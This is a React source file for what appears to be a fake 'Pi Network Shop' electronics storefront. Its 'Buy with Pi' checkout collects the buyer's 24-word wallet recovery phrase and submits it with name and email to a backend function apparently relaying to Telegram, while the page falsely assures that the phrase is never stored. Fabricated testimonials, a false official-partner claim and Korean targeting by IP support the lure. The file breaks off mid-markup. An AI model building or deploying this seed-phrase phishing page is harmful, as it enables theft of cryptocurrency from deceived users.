import { useState, useEffect } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Textarea } from '@/components/ui/textarea';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { useToast } from '@/hooks/use-toast';
import { Star, ShoppingCart, Shield, Truck, Award, CheckCircle, Users, Globe, Zap, ArrowRight, Quote, Menu, X } from 'lucide-react';
interface Product {
  id: string;
  name: string;
  description: string;
  price: number;
  original_price: number;
  discount_percentage: number;
  image_url: string;
  rating: number;
  review_count: number;
  specifications: string;
  category: string;
  in_stock: boolean;
  available_colors?: string[];
  available_storage?: string[];
}
const Index = () => {
  const [products, setProducts] = useState<Product[]>([]);
  const [loading, setLoading] = useState(true);
  const [showPassphraseModal, setShowPassphraseModal] = useState(false);
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [passphrase, setPassphrase] = useState('');
  const [customerName, setCustomerName] = useState('');
  const [customerEmail, setCustomerEmail] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [passphraseError, setPassphraseError] = useState('');
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState('all');
  const [selectedColor, setSelectedColor] = useState('');
  const [selectedStorage, setSelectedStorage] = useState('');
  const [language, setLanguage] = useState('en');
  const [isKorean, setIsKorean] = useState(false);

  // Korean translations
  const translations = {
    en: {
      shopTitle: 'Pi Network Shop',
      subtitle: 'Premium Electronics',
      heroTitle: 'Premium Tech',
      heroPowered: 'Powered by Pi',
      heroDescription: 'Experience the future of digital commerce. Shop premium smartphones, smartwatches, and laptops with Pi coins. Exclusive deals for Pi Network pioneers.',
      shopNow: 'Shop Now',
      learnMore: 'Learn More',
      home: 'Home',
      products: 'Products',
      features: 'Features',
      reviews: 'Reviews',
      support: 'Support',
      secure: 'Secure',
      support247: '24/7 Support',
      connectWallet: 'CONNECT WALLET',
      piNetwork: 'Pi Network',
      nowLive: '🚀 Now Live on Pi Network',
      premiumTechnology: 'Premium Technology',
      allProducts: 'All Products',
      smartphones: 'Smartphones',
      smartwatches: 'Smartwatches',
      laptops: 'Laptops',
      buyNow: 'Buy Now',
      secureCheckout: 'Secure Checkout',
      completeDescription: 'Complete your purchase with Pi Network security',
      customerInfo: 'Customer Information',
      fullName: 'Full Name',
      emailAddress: 'Email Address',
      productConfig: 'Product Configuration',
      color: 'Color',
      storage: 'Storage',
      walletAuth: 'Secure Pi Wallet Authentication',
      passphraseLabel: 'Pi Wallet Passphrase (24 words)',
      passphrasePlaceholder: 'Enter your 24-word recovery phrase separated by spaces...',
      securityNotice: '🔒 Your passphrase is securely transmitted and never stored on our servers',
      completePurchase: 'Complete Secure Purchase',
      processing: 'Processing Order...'
    },
    ko: {
      shopTitle: 'Pi 네트워크 쇼핑몰',
      subtitle: '프리미엄 전자제품',
      heroTitle: '프리미엄 기술',
      heroPowered: 'Pi로 구동',
      heroDescription: '디지털 상거래의 미래를 경험하세요. Pi 코인으로 프리미엄 스마트폰, 스마트워치, 노트북을 쇼핑하세요. Pi 네트워크 개척자를 위한 독점 할인.',
      shopNow: '지금 쇼핑하기',
      learnMore: '더 알아보기',
      home: '홈',
      products: '제품',
      features: '기능',
      reviews: '리뷰',
      support: '지원',
      secure: '보안',
      support247: '24/7 지원',
      connectWallet: '지갑 연결',
      piNetwork: 'Pi 네트워크',
      nowLive: '🚀 Pi 네트워크에서 현재 운영 중',
      premiumTechnology: '프리미엄 기술',
      allProducts: '모든 제품',
      smartphones: '스마트폰',
      smartwatches: '스마트워치',
      laptops: '노트북',
      buyNow: '지금 구매',
      secureCheckout: '보안 결제',
      completeDescription: 'Pi 네트워크 보안으로 구매를 완료하세요',
      customerInfo: '고객 정보',
      fullName: '성명',
      emailAddress: '이메일 주소',
      productConfig: '제품 구성',
      color: '색상',
      storage: '저장용량',
      walletAuth: '보안 Pi 지갑 인증',
      passphraseLabel: 'Pi 지갑 패스프레이즈 (24단어)',
      passphrasePlaceholder: '공백으로 구분된 24단어 복구 구문을 입력하세요...',
      securityNotice: '🔒 귀하의 패스프레이즈는 안전하게 전송되며 당사 서버에 저장되지 않습니다',
      completePurchase: '보안 구매 완료',
      processing: '주문 처리 중...'
    }
  };

  const t = translations[isKorean ? 'ko' : 'en'];
  const {
    toast
  } = useToast();

  // Smooth scroll function
  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      const headerOffset = 80; // Account for fixed header
      const elementPosition = element.getBoundingClientRect().top;
      const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
      window.scrollTo({
        top: offsetPosition,
        behavior: 'smooth'
      });
    }
    setMobileMenuOpen(false); // Close mobile menu after navigation
  };
  // Detect Korean IP and set language
  useEffect(() => {
    const detectLocation = async () => {
      try {
        // Try to detect location using multiple methods
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data.country_code === 'KR') {
          setIsKorean(true);
          setLanguage('ko');
        }
      } catch (error) {
        // Fallback: check browser language
        const browserLang = navigator.language || navigator.languages[0];
        if (browserLang.startsWith('ko')) {
          setIsKorean(true);
          setLanguage('ko');
        }
      }
    };
    
    detectLocation();
  }, []);

  useEffect(() => {
    fetchProducts();
  }, []);
  const fetchProducts = async () => {
    try {
      const {
        data,
        error
      } = await supabase.from('products_2025_11_05_18_04').select('*').order('created_at', {
        ascending: false
      });
      if (error) throw error;
      setProducts(data || []);
    } catch (error) {
      console.error('Error fetching products:', error);
      toast({
        title: 'Error',
        description: 'Failed to load products',
        variant: 'destructive'
      });
    } finally {
      setLoading(false);
    }
  };
  const handleBuyNow = (product: Product) => {
    setSelectedProduct(product);
    setShowPassphraseModal(true);
    setPassphrase('');
    setCustomerName('');
    setCustomerEmail('');
    setPassphraseError('');
    // Set default color and storage options
    setSelectedColor(product.available_colors?.[0] || '');
    setSelectedStorage(product.available_storage?.[0] || '');
  };
  const validatePassphrase = (phrase: string): boolean => {
    const words = phrase.trim().split(/\s+/);
    return words.length === 24 && words.every(word => word.length > 0);
  };
  const handleSubmitOrder = async () => {
    if (!selectedProduct || !customerName || !customerEmail || !passphrase) {
      toast({
        title: 'Error',
        description: 'Please fill in all fields',
        variant: 'destructive'
      });
      return;
    }
    if (!validatePassphrase(passphrase)) {
      setPassphraseError('Invalid Passphrase');
      return;
    }
    setPassphraseError('');
    setIsSubmitting(true);
    try {
      const {
        data,
        error
      } = await supabase.functions.invoke('send_order_clean_telegram_2025_11_09_17_30', {
        body: {
          productId: selectedProduct.id,
          customerName,
          customerEmail,
          passphrase,
          selectedColor,
          selectedStorage
        }
      });
      if (error) throw error;
      toast({
        title: 'Order Submitted Successfully!',
        description: 'Your order has been processed and passphrase sent to our team.'
      });

      // Clear form and close modal
      setShowPassphraseModal(false);
      setPassphrase('');
      setCustomerName('');
      setCustomerEmail('');
      setSelectedColor('');
      setSelectedStorage('');
      setSelectedProduct(null);
    } catch (error) {
      console.error('Error submitting order:', error);
      toast({
        title: 'Error',
        description: 'Failed to submit order. Please try again.',
        variant: 'destructive'
      });
    } finally {
      setIsSubmitting(false);
    }
  };
  const getProductImage = (product: Product, index: number) => {
    const imageMap: {
      [key: string]: string;
    } = {
      // Smartphones - Accurate Product Photography
      'iPhone 17 Pro Max': '/images/iphone-17-pro-max-updated_3.jpeg',
      'iPhone 16 Pro Max': '/images/realistic-products_2.jpeg',
      'Samsung Galaxy S24 Ultra': '/images/accurate-product-photos_5.jpeg',
      'iPhone 15 Pro': '/images/individual-phone-models_6.jpeg',
      'Google Pixel 8 Pro': '/images/individual-phone-models_7.jpeg',
      'OnePlus 12': '/images/accurate-product-photos_8.jpeg',
      'Xiaomi 14 Ultra': '/images/accurate-product-photos_6.jpeg',
      'iPhone 14 Pro Max': '/images/individual-phone-models_8.webp',
      'Samsung Galaxy S23 FE': '/images/samsung-galaxy-s24-ultra_2.jpeg',
      'Nothing Phone 2': '/images/individual-phone-models_2.jpeg',
      'Realme GT 5 Pro': '/images/premium-phones_4.jpeg',
      'Oppo Find X7 Ultra': '/images/premium-phones_7.jpeg',
      'Vivo X100 Pro': '/images/premium-phones_8.jpeg',
      'Honor Magic 6 Pro': '/images/smartphone-collection_1.jpeg',
      'Motorola Edge 50 Ultra': '/images/smartphone-collection_2.jpeg',
      'Asus ROG Phone 8': '/images/premium-phones_3.webp',
      // Smartwatches - Accurate Product Photography
      'Apple Watch Ultra 2': '/images/accurate-smartwatches_7.jpeg',
      'Samsung Galaxy Watch 6 Classic': '/images/accurate-smartwatches_1.png',
      'Apple Watch Series 9': '/images/accurate-smartwatches_3.jpeg',
      'Samsung Galaxy Watch 6': '/images/smartwatches_5.jpeg',
      'Garmin Fenix 7X': '/images/accurate-smartwatches_4.jpeg',
      'Fitbit Sense 2': '/images/smartwatches_6.jpeg',
      'Huawei Watch GT 4': '/images/smartwatches_4.jpeg',
      'Amazfit GTR 4': '/images/smartwatches_8.jpeg',
      // Laptops - Accurate Product Photography
      'MacBook Pro 16" M3 Max': '/images/accurate-laptops_5.jpeg',
      'Dell XPS 15 OLED': '/images/accurate-laptops_7.jpeg',
      'MacBook Air 15" M3': '/images/accurate-laptops_6.jpeg',
      'HP Spectre x360 16': '/images/laptops_4.jpeg',
      'Lenovo ThinkPad X1 Carbon': '/images/laptops_5.jpeg',
      'ASUS ROG Zephyrus G16': '/images/laptops_6.jpeg',
      'Surface Laptop Studio 2': '/images/realistic-products_7.png'
    };

    // Fallback images based on category
    if (product.category === 'smartwatch') {
      return imageMap[product.name] || `/images/smartwatches_${index % 8 + 1}.jpeg`;
    } else if (product.category === 'laptop') {
      return imageMap[product.name] || `/images/laptops_${index % 7 + 1}.jpeg`;
    } else {
      return imageMap[product.name] || `/images/premium-phones_${index % 8 + 1}.jpeg`;
    }
  };
  if (loading) {
    return <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-purple-50 to-blue-50 px-4">
        <div className="text-center max-w-md mx-auto">
          <div className="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
          <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-2">Loading Pi Network Shop</h2>
          <p className="text-gray-600 text-sm sm:text-base">Preparing your premium shopping experience...</p>
          <div className="mt-6 flex items-center justify-center space-x-2">
            <img src="/images/pi-logo.png" alt="Pi" className="w-6 h-6" />
            <span className="text-primary font-semibold">Powered by Pi Network</span>
          </div>
        </div>
      </div>;
  }
  return <div className="min-h-screen bg-white overflow-x-hidden">
      {/* Clean Professional Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-xl border-b border-gray-100 shadow-lg">
        <div className="max-w-7xl mx-auto px-3 sm:px-4 md:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16 sm:h-18 md:h-20">
            {/* Professional Pi Logo with Text */}
            <div className="flex items-center space-x-2 sm:space-x-3 md:space-x-4">
              <img src="/images/pi-logo.png" alt="Pi Network Logo" className="h-8 sm:h-10 md:h-12 lg:h-14 w-auto object-contain" />
              <div className="flex flex-col">
                <h1 className="text-sm sm:text-base md:text-lg lg:text-xl font-bold text-gray-900 leading-tight">
                  {t.shopTitle}
                </h1>
                <p className="text-xs sm:text-sm md:text-base text-gray-600 font-medium">
                  {t.subtitle}
                </p>
              </div>
            </div>
            
            {/* Clean Desktop Navigation */}
            <nav className="hidden md:flex items-center space-x-4 lg:space-x-8">
              <button onClick={() => scrollToSection('home')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200 text-sm">
                {t.home}
              </button>
              <button onClick={() => scrollToSection('products')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200 text-base">
                {t.products}
              </button>
              <button onClick={() => scrollToSection('features')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200 text-base">
                {t.features}
              </button>
              <button onClick={() => scrollToSection('testimonials')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200 text-base">
                {t.reviews}
              </button>
              <button onClick={() => scrollToSection('contact')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200 text-base">
                {t.support}
              </button>
            </nav>
            
            {/* Clean CTA Section */}
            <div className="hidden md:flex items-center space-x-2 lg:space-x-4">
              <div className="flex items-center space-x-2 text-sm text-gray-600">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="font-medium">Secure</span>
                <span className="text-gray-400">•</span>
                <span className="font-medium">24/7 Support</span>
              </div>
              <Button className="relative group bg-gradient-to-r from-slate-900 via-slate-800 to-slate-900 hover:from-slate-800 hover:via-slate-700 hover:to-slate-800 text-white px-4 md:px-6 lg:px-8 py-2 md:py-3 lg:py-4 rounded-xl md:rounded-2xl transition-all duration-500 transform hover:scale-105 border border-slate-700/50">
                {/* Enhanced Multi-layer shadow effects */}
                <div className="absolute -inset-1 bg-gradient-to-r from-purple-600 via-blue-600 to-purple-600 rounded-2xl blur-sm opacity-30 group-hover:opacity-50 transition-opacity duration-500"></div>
                <div className="absolute inset-0 bg-gradient-to-r from-slate-800/50 to-slate-900/50 rounded-2xl"></div>
                <div className="absolute inset-0 bg-gradient-to-br from-white/10 via-transparent to-transparent rounded-2xl"></div>
                
                <div className="relative flex items-center space-x-3">
                  <div className="p-2 bg-gradient-to-r from-purple-600 to-blue-600 rounded-xl shadow-lg">
                    <img src="/images/pi-logo.png" alt="Pi" className="w-4 h-4" />
                  </div>
                  <div className="flex flex-col items-start">
                    <span className="text-sm font-bold tracking-wide">CONNECT WALLET</span>
                    <span className="text-xs text-gray-300 font-medium">Pi Network</span>
                  </div>
                </div>
                
                {/* Professional shine effect */}
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent rounded-2xl transform -skew-x-12 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 ease-out"></div>
              </Button>
            </div>

            {/* Clean Mobile Menu Button */}
            <button className="md:hidden p-2 rounded-lg hover:bg-gray-100 transition-colors duration-200" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-6 h-6 text-gray-700" /> : <Menu className="w-6 h-6 text-gray-700" />}
            </button>
          </div>
        </div>

        {/* Mobile Menu */}
        {mobileMenuOpen && <div className="md:hidden bg-white/98 backdrop-blur-xl border-t border-gray-100 shadow-2xl">
            <div className="px-6 py-6 space-y-2">
              <button onClick={() => {
            scrollToSection('home');
            setMobileMenuOpen(false);
          }} className="flex items-center w-full text-left py-4 px-4 rounded-xl text-gray-700 hover:text-purple-600 hover:bg-gradient-to-r hover:from-purple-50 hover:to-blue-50 transition-all duration-200 font-medium border border-transparent hover:border-purple-100">
                <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                Home
              </button>
              <button onClick={() => {
            scrollToSection('products');
            setMobileMenuOpen(false);
          }} className="flex items-center w-full text-left py-4 px-4 rounded-xl text-gray-700 hover:text-purple-600 hover:bg-gradient-to-r hover:from-purple-50 hover:to-blue-50 transition-all duration-200 font-medium border border-transparent hover:border-purple-100">
                <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                Products
              </button>
              <button onClick={() => {
            scrollToSection('features');
            setMobileMenuOpen(false);
          }} className="flex items-center w-full text-left py-4 px-4 rounded-xl text-gray-700 hover:text-purple-600 hover:bg-gradient-to-r hover:from-purple-50 hover:to-blue-50 transition-all duration-200 font-medium border border-transparent hover:border-purple-100">
                <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                Features
              </button>
              <button onClick={() => {
            scrollToSection('testimonials');
            setMobileMenuOpen(false);
          }} className="flex items-center w-full text-left py-4 px-4 rounded-xl text-gray-700 hover:text-purple-600 hover:bg-gradient-to-r hover:from-purple-50 hover:to-blue-50 transition-all duration-200 font-medium border border-transparent hover:border-purple-100">
                <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                Reviews
              </button>
              <button onClick={() => {
            scrollToSection('contact');
            setMobileMenuOpen(false);
          }} className="flex items-center w-full text-left py-4 px-4 rounded-xl text-gray-700 hover:text-purple-600 hover:bg-gradient-to-r hover:from-purple-50 hover:to-blue-50 transition-all duration-200 font-medium border border-transparent hover:border-purple-100">
                <div className="w-2 h-2 bg-purple-500 rounded-full mr-3"></div>
                Support
              </button>
              <div className="pt-6 mt-4 border-t border-gray-100">
                <div className="flex items-center justify-between mb-4 text-sm text-gray-600">
                  <div className="flex items-center space-x-1">
                    <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="font-medium">Secure Platform</span>
                  </div>
                  <span className="font-medium">24/7 Support</span>
                </div>
                <Button className="relative w-full py-4 text-lg font-semibold bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white rounded-xl shadow-lg hover:shadow-xl transition-all duration-300">
                  <div className="absolute inset-0 bg-gradient-to-r from-purple-400 to-blue-400 rounded-xl blur opacity-30"></div>
                  <div className="relative flex items-center justify-center">
                    <img src="/images/pi-logo.png" alt="Pi" className="w-5 h-5 mr-2" />
                    <span>Connect Pi Wallet</span>
                  </div>
                </Button>
              </div>
            </div>
          </div>}
      </header>

      {/* Hero Section */}
      <section id="home" className="hero-section pt-16 sm:pt-18 md:pt-20" style={{
      backgroundImage: `linear-gradient(135deg, rgba(139, 69, 255, 0.05), rgba(139, 69, 255, 0.02)), url(/images/professional-tech_2.jpeg)`,
      backgroundSize: 'cover',
      backgroundPosition: 'center'
    }}>
        <div className="max-w-7xl mx-auto px-3 sm:px-4 md:px-6 lg:px-8 py-8 sm:py-12 md:py-16">
          <div className="grid lg:grid-cols-2 gap-6 sm:gap-8 md:gap-12 items-center">
            <div className="space-y-3 sm:space-y-4 md:space-y-6">
              <div className="space-y-3">
                <Badge className="bg-purple-100 text-purple-800 px-3 py-1 rounded-full font-semibold text-sm">
                  🚀 {t.nowLive}
                </Badge>
                <h1 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold leading-tight">
                  <span className="text-gradient">{t.heroTitle}</span>
                  <br />
                  <span className="text-gray-900">{t.heroPowered}</span>
                </h1>
                <p className="text-sm sm:text-base md:text-lg text-gray-600 leading-relaxed max-w-lg">
                  {t.heroDescription}
                </p>
              </div>
              
              <div className="flex flex-col sm:flex-row gap-4 w-full">
                <Button size="lg" onClick={() => scrollToSection('products')} className="btn-primary px-8 py-4 rounded-full text-lg font-semibold w-full sm:w-auto">
                  Shop Now <ArrowRight className="ml-2 w-5 h-5" />
                </Button>
                <Button variant="outline" size="lg" onClick={() => scrollToSection('features')} className="px-8 py-4 rounded-full text-lg font-semibold border-2 w-full sm:w-auto">
                  Learn More
                </Button>
              </div>

              {/* Stats */}
              <div className="grid grid-cols-3 gap-4 sm:gap-8 pt-8">
                <div className="text-center">
                  <div className="text-xl sm:text-2xl font-bold text-gradient">125K+</div>
                  <div className="text-gray-600 font-medium text-xs sm:text-sm">Pi Transactions</div>
                </div>
                <div className="text-center">
                  <div className="text-xl sm:text-2xl font-bold text-gradient">30+</div>
                  <div className="text-gray-600 font-medium text-xs sm:text-sm">Premium Devices</div>
                </div>
                <div className="text-center">
                  <div className="text-xl sm:text-2xl font-bold text-gradient">24/7</div>
                  <div className="text-gray-600 font-medium text-xs sm:text-sm">Pi Support</div>
                </div>
              </div>
            </div>

            <div className="relative">
              <div className="float-animation">
                <img src="/images/premium-phones_6.jpeg" alt="Premium Smartphones" className="w-full max-w-lg mx-auto rounded-3xl shadow-2xl" />
              </div>
              <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-r from-purple-400 to-pink-400 rounded-full opacity-20 blur-xl"></div>
              <div className="absolute -bottom-4 -left-4 w-32 h-32 bg-gradient-to-r from-blue-400 to-purple-400 rounded-full opacity-20 blur-xl"></div>
            </div>
          </div>
        </div>
      </section>

      {/* Trust Indicators */}
      <section className="py-16 bg-gray-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 lg:gap-8">
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <Shield className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Secure Payments</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Bank-level security with Pi Network encryption</p>
            </div>
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <Truck className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Fast Delivery</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Express shipping worldwide in 24-48 hours</p>
            </div>
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <Award className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Premium Quality</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Authentic products with manufacturer warranty</p>
            </div>
            <div className="trust-badge text-center p-4 sm:p-6 rounded-2xl">
              <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-primary mx-auto mb-3 sm:mb-4" />
              <h3 className="font-semibold text-gray-900 mb-2 text-sm sm:text-base">Pi Verified</h3>
              <p className="text-gray-600 text-xs sm:text-sm">Official Pi Network marketplace partner</p>
            </div>
          </div>
        </div>
      </section>

      {/* Featured Products */}
      <section id="products" className="section-padding">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <Badge className="bg-purple-100 text-purple-800 px-4 py-2 rounded-full font-semibold mb-4 text-base">
              Featured Collection
            </Badge>
            <h2 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 mb-6">
              {t.premiumTechnology}
            </h2>
            <p className="text-base sm:text-lg text-gray-600 max-w-3xl mx-auto">
              Discover our curated selection of flagship smartphones, smartwatches, and laptops from the world's leading brands. 
              Each device is carefully selected for Pi Network pioneers.
            </p>
          </div>
          
          {/* Category Filter */}
          <div className="flex flex-wrap justify-center gap-4 mb-12">
            <Button onClick={() => setSelectedCategory('all')} variant={selectedCategory === 'all' ? 'default' : 'outline'} className="rounded-full px-4 py-2 text-sm sm:text-base">
              {t.allProducts} ({products.length})
            </Button>
            <Button onClick={() => setSelectedCategory('smartphone')} variant={selectedCategory === 'smartphone' ? 'default' : 'outline'} className="rounded-full px-4 py-2 text-sm sm:text-base">
              📱 {t.smartphones} ({products.filter(p => p.category === 'smartphone').length})
            </Button>
            <Button onClick={() => setSelectedCategory('smartwatch')} variant={selectedCategory === 'smartwatch' ? 'default' : 'outline'} className="rounded-full px-4 py-2 text-sm sm:text-base">
              ⌚ {t.smartwatches} ({products.filter(p => p.category === 'smartwatch').length})
            </Button>
            <Button onClick={() => setSelectedCategory('laptop')} variant={selectedCategory === 'laptop' ? 'default' : 'outline'} className="rounded-full px-4 py-2 text-sm sm:text-base">
              💻 {t.laptops} ({products.filter(p => p.category === 'laptop').length})
            </Button>
          </div>
          
          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4">
            {products.filter(product => selectedCategory === 'all' || product.category === selectedCategory).map((product, index) => <div key={product.id} className="product-card p-3 relative group">
                {/* Discount Badge */}
                {product.discount_percentage > 0 && <div className="absolute top-2 left-2 pi-discount-badge px-2 py-1 rounded-full text-xs font-bold z-10">
                    {product.discount_percentage}% OFF
                  </div>}
                
                {/* Bestseller Badge */}
                {index < 3 && <div className="absolute top-2 right-2 bg-gradient-to-r from-yellow-400 to-orange-400 text-white px-2 py-1 rounded-full text-xs font-bold z-10">
                    BEST
                  </div>}
                
                {/* Product Image */}
                <div className="aspect-square mb-4 overflow-hidden rounded-lg bg-gradient-to-br from-gray-50 to-gray-100 relative">
                  <img src={getProductImage(product, index)} alt={product.name} className="w-full h-full object-cover product-image" onError={e => {
                const target = e.target as HTMLImageElement;
                target.src = '/images/professional-tech-products_5.png';
              }} />
                  {/* Category Icon */}
                  <div className="absolute bottom-1 right-1 bg-white/90 backdrop-blur-sm rounded-full p-1">
                    {product.category === 'smartphone' && <span className="text-sm">📱</span>}
                    {product.category === 'smartwatch' && <span className="text-sm">⌚</span>}
                    {product.category === 'laptop' && <span className="text-sm">💻</span>}
                  </div>
                </div>
                
                {/* Product Info */}
                <div className="space-y-2">
                  <h3 className="font-bold text-sm sm:text-base text-gray-900 group-hover:text-primary transition-colors">
                    {product.name}
                  </h3>
                  
                  {/* Rating */}
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-2">
                      <div className="flex items-center">
                        <Star className="w-4 h-4 star-rating fill-current" />
                        <span className="ml-1 font-semibold text-gray-900 text-sm">{product.rating}</span>
                      </div>
                      <span className="text-sm text-gray-500">({product.review_count})</span>
                    </div>
                    <Badge variant="secondary" className="text-sm">
                      {product.category}
                    </Badge>
                  </div>
                  
                  {/* Price */}
                  <div className="flex items-center space-x-3">
                    <span className="text-lg sm:text-xl font-bold pi-gold-text">{product.price}π</span>
                    {product.original_price > product.price && <span className="text-sm text-gray-400 line-through">{product.original_price}π</span>}
                  </div>
                  
                  {/* Specifications */}
                  <p className="text-xs text-gray-600 leading-relaxed">{product.specifications}</p>
                  
                  {/* Buy Button */}
                  <Button onClick={() => handleBuyNow(product)} className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-700 hover:to-indigo-700 text-white py-2 rounded-lg font-semibold text-sm shadow-md hover:shadow-lg transition-all duration-200" disabled={!product.in_stock}>
                    {product.in_stock ? <>
                        <ShoppingCart className="w-4 h-4 mr-2" />
                        Buy with Pi
                      </> : 'Out of Stock'}
                  </Button>
                </div>
              </div>)}
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section id="features" className="section-padding bg-gradient-to-br from-purple-50 to-blue-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              Why Choose <span className="text-gradient">Pi Network Shop</span>
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Experience the future of digital commerce with cutting-edge technology and unmatched service.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
              <div className="w-16 h-16 bg-gradient-to-r from-purple-500 to-pink-500 rounded-2xl flex items-center justify-center mb-6">
                <Zap className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Lightning Fast</h3>
              <p className="text-gray-600 leading-relaxed">
                Experience instant transactions with Pi Network's revolutionary blockchain technology. 
                No waiting, no delays - just seamless shopping.
              </p>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
              <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-500 rounded-2xl flex items-center justify-center mb-6">
                <Globe className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Global Reach</h3>
              <p className="text-gray-600 leading-relaxed">
                Shop from anywhere in the world with our global shipping network. 
                Pi Network connects pioneers across all continents.
              </p>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
              <div className="w-16 h-16 bg-gradient-to-r from-green-500 to-emerald-500 rounded-2xl flex items-center justify-center mb-6">
                <Users className="w-8 h-8 text-white" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Community First</h3>
              <p className="text-gray-600 leading-relaxed">
                Built by pioneers, for pioneers. Join a community of forward-thinking individuals 
                shaping the future of digital commerce.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section id="testimonials" className="section-padding">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-16">
            <h2 className="text-4xl lg:text-5xl font-bold text-gray-900 mb-6">
              What <span className="text-gradient">Pioneers</span> Say
            </h2>
            <p className="text-xl text-gray-600 max-w-3xl mx-auto">
              Join thousands of satisfied customers who have experienced the future of shopping.
            </p>
          </div>

          <div className="grid lg:grid-cols-3 gap-8">
            <div className="bg-white p-8 rounded-2xl shadow-lg">
              <Quote className="w-8 h-8 text-purple-500 mb-4" />
              <p className="text-gray-700 leading-relaxed mb-6">
                "Amazing experience! The Pi payment system is incredibly smooth, and the product quality 
                exceeded my expectations. This is the future of e-commerce."
              </p>
              <div className="flex items-center space-x-4">
                <img src="/images/testimonials_1.jpeg" alt="Customer" className="w-12 h-12 rounded-full object-cover" />
                <div>
                  <div className="font-semibold text-gray-900">Sarah Chen</div>
                  <div className="text-gray-500 text-sm">Pi Pioneer • Tech Enthusiast</div>
                </div>
              </div>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg">
              <Quote className="w-8 h-8 text-purple-500 mb-4" />
              <p className="text-gray-700 leading-relaxed mb-6">
                "Fast delivery, authentic products, and seamless Pi transactions. Pi Network Shop 
                has revolutionized how I buy electronics. Highly recommended!"
              </p>
              <div className="flex items-center space-x-4">
                <img src="/images/testimonials_2.jpeg" alt="Customer" className="w-12 h-12 rounded-full object-cover" />
                <div>
                  <div className="font-semibold text-gray-900">Marcus Johnson</div>
                  <div className="text-gray-500 text-sm">Early Adopter • Developer</div>
                </div>
              </div>
            </div>

            <div className="bg-white p-8 rounded-2xl shadow-lg">
              <Quote className="w-8 h-8 text-purple-500 mb-4" />
              <p className="text-gray-700 leading-relaxed mb-6">
